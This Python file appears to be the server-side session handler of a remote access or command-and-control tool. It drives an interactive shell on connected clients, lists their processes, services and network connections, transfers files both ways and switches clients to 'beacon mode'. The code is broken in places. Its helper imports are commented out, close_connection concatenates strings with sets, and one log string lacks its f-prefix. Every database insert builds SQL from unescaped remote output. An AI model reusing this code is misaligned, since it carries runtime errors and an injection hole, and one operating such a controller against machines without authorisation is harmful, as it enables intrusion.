from ServerDatabase.database import DatabaseClass
# from .global_objects import (
#     send_data,
#     receive_data,
#     remove_connection_list,
#     send_data_loadingbar,
# )
from datetime import datetime
from tqdm import tqdm
from typing import Tuple

import os
import colorama
import ssl


class Session:
    """Handles commands within a session"""
    def __init__(self, address, details, hostname, operating_system, mode):
        self.address = address
        self.details = details
        self.hostname = hostname
        self.operating_system = operating_system
        self.mode = mode
        self.database = DatabaseClass()  # laods database class
        colorama.init(autoreset=True)  # resets colorama after each function

    def close_connection(self, conn: ssl.SSLSocket,
                         r_address: Tuple[str, int]) -> None:
        """
        closes connection from the current session within the session commands
        """
        # confirmation to close connection
        if (input(
                colorama.Back.RED +
                "Are you sure want to close the connection?: Y/N ").lower()
                == "y"):
            print(
                colorama.Back.YELLOW +
                colorama.Fore.BLACK +
                "Closing " +
                {r_address[0]} + ":" + {r_address[1]})

            try:
                send_data(conn, "shutdown")  # sends shutdown mesage to client
            except BaseException:  # handles ssl.SSLEOFError
                pass
            remove_connection_list(r_address)  # removes connection from lists
            conn.close()  # closes conneciton
            print(colorama.Back.GREEN + "Closed")  # user message
        else:
            print(
                colorama.Back.GREEN +
                "Connection not closed")  # user message
        return

    def shell(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """runs a shell between the sessions client and server"""
        print(
            f"Shell {r_address[0]}:{r_address[1]}: Type exit to quit session")
        send_data(conn, "shell")
        details = receive_data(conn)
        username, cwd = details.split("<sep>")
        while True:
            command = input(
                f"{username}@{r_address[0]}:{r_address[1]}-[{cwd}]: ")
            if not command.strip():
                continue
            send_data(conn, command)
            if command.lower() == "exit":
                break
            output = receive_data(conn)
            results, _, cwd = output.rpartition("<sep>")
            self.database.insert_entry("Shell", f"'{r_address[0]}'," +
                                       f"'{datetime.now()}', " +
                                       f"'{command}', '{results}'")
            print(results)
        return

    def list_processes(self, conn: ssl.SSLSocket,
                       r_address: Tuple[str, int]) -> None:
        """list processes running on client"""
        send_data(
            conn,
            "list_processes")
        processes = receive_data(conn)
        self.database.insert_entry(
            "Processes",
            f'"{r_address[0]}","{processes}",' +
            f'"{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
        print(processes)
        return

    def systeminfo(self, conn: ssl.SSLSocket,
                   r_address: Tuple[str, int]) -> None:
        """gets the systeminfo of the client"""
        send_data(
            conn,
            "systeminfo")  # sends the system info command to start the process
        data = receive_data(conn)  # recives data
        print(data)  # prints the results
        self.database.insert_entry(
            "SystemInfo", f'"{r_address[0]}","{data}",' +
            f'"{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
        return

    def checkfiles(self, conn: ssl.SSLSocket) -> None:
        """checks files against known hashes in the database """
        send_data(
            conn,
            "checkfiles")  # call the check files function on the client
        # ask what files wants to be checked
        send_data(conn, input("What File do you want to check? "))
        # recieves the number of files being checked
        length = receive_data(conn)
        # initalise the variables
        errors = []
        missinghashes = []
        file_name = ""
        Error = False
        nomatch = False
        # tells user how many files are being checked
        print(colorama.Back.GREEN + f"Checking {length} files")
        for i in tqdm(
                range(
                    0,
                    int(length)),
                desc="Files Hashes",
                colour="#39ff14"):  # loading bar for range of files
            file_name = receive_data(conn)  # recives the filename
            if file_name == "break":  # break means all files are done or error
                break
            hashed = receive_data(conn)  # recieves hashed file
            if file_name == "Error":  # if an error has occured
                errors.append(hashed)  # had message to error list
                Error = True  # ensures the errors are printed
            else:
                if str(
                    self.database.search_query(
                        "*",
                        "Hashes",
                        "Hash",
                        hashed)) == "None":
                    missinghashes.append(f"{file_name} is not in the database")
                    nomatch = True
            i += 1
        if Error:
            for message in errors:
                print(colorama.Back.YELLOW + colorama.Fore.BLACK + message)
        if nomatch:  # prints missing hashes
            for message in missinghashes:
                print(colorama.Back.RED + message)
        else:
            print(
                colorama.Back.GREEN +
                "All hashes match a hash in the database")  # all hashes good
        return

    def DownloadFiles(self, conn: ssl.SSLSocket) -> None:
        """ Function downloads a files from the client to the server"""
        send_data(
            conn,
            "send_file")  # calls the send files function on the client
        # asks what file the user wants to download
        filename = input("What file do you want to download? ")
        send_data(conn, filename)  # sends the filename
        # gets the basename of the file to write too
        filename = os.path.basename(filename)
        data = receive_data(conn)  # recieves file data
        if data == "Error":  # if the data is error, print an error message
            print(colorama.Back.RED + receive_data(conn))
        else:
            if isinstance(
                    data, str):  # if its a string encode it (for text files)
                data = data.encode()
            with open(filename, "wb") as f:
                f.write(data)
                f.close()  # close the file
            print(
                colorama.Back.GREEN +
                "File Downloaded")  # Confirmation method
        return

    def UploadFiles(self, conn: ssl.SSLSocket) -> None:
        """upload files from the server to the client"""
        send_data(conn, "recv_file")
        # ask what file to upload
        filename = input("What file do you want to upload? ")
        try:
            with open(filename, "rb") as f:  # open the file name
                send_data(conn, os.path.basename(filename))
                # send the file to the client
                send_data_loadingbar(conn, f.read(os.path.getsize(filename)))
                f.close()
            # confirmation method server side
            print(colorama.Back.GREEN + "File uploaded")
            print(
                colorama.Back.YELLOW +
                colorama.Fore.BLACK +
                "Waiting for confirmation from client")
            if receive_data(conn) == "True":  # confirmation method client side
                print(colorama.Back.GREEN + "File recieved succesfully")
            else:
                print(colorama.Back.RED + "File was not received properly")
        except FileNotFoundError:  # file not found error
            print(colorama.Back.RED + "File doesn't exist")
            send_data(conn, "break")  # cancels upload on client side
            return
        except PermissionError:  # permission error
            print(
                colorama.Back.RED +
                "You do not have permission to access this file")
            send_data(conn, "break")  # cancels upload on client side
        except IsADirectoryError:
            print(colorama.Back.RED + "This is a directory")  # directory error
            send_data(conn, "break")  # cancels upload on client side
        return

    def list_services(self, conn: ssl.SSLSocket,
                      r_address: Tuple[str, int]) -> None:
        """lists services on the client"""
        send_data(
            conn,
            "list_services")  # calls list_services function on the client
        services = receive_data(conn)  # recieve the services
        self.database.insert_entry(
            "Services",
            f'"{r_address[0]}","{services}","'
            f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
        print(services)
        return

    def netstat(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """prints netstat details from the client"""
        netstat = ""  # intialises variable
        send_data(conn, "netstat")  # calls netstat function on the client side
        while True:
            data = receive_data(conn)  # recives data
            if data == "break":  # last line
                break
            netstat += data  # adds line of data to string
        print(colorama.Fore.YELLOW + netstat)  # prints netstat
        self.database.insert_entry(
            "Netstat",
            f'"{r_address[0]}","{netstat}","{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"') # noqa
        return

    def diskusage(self, conn: ssl.SSLSocket,
                  r_address: Tuple[str, int]) -> None:
        """prints the diskuage for the client"""
        send_data(
            conn,
            "disk_usage")
        results = receive_data(conn)
        self.database.insert_entry(
            "Disk",
            f'"{r_address[0]}","{results}","{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"') # noqa
        print(colorama.Fore.YELLOW + results)

    def list_dir(self, conn: ssl.SSLSocket,
                 r_address: Tuple[str, int]) -> None:
        """list a directory on the client"""
        send_data(conn, "list_dir")
        dir = input("What directory do you want to list?: ")
        send_data(conn, dir)
        directory = receive_data(conn)
        if str(directory).startswith("Error:"):
            pass
        else:
            try:
                self.database.insert_entry(
                    "Shell", f'"{r_address[0]}' +
                    f'","{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}",' +
                    ' "ls {dir}", "{directory}"')
            except BaseException:
                pass
        print(directory)

    def change_beacon(self, conn: ssl.SSLSocket,
                      r_address: Tuple[str, int], uuid) -> None:
        send_data(conn, "switch_beacon")
        print(colorama.Fore.GREEN + f"{uuid} will be switched to beacon mode")
        remove_connection_list(r_address)
        return
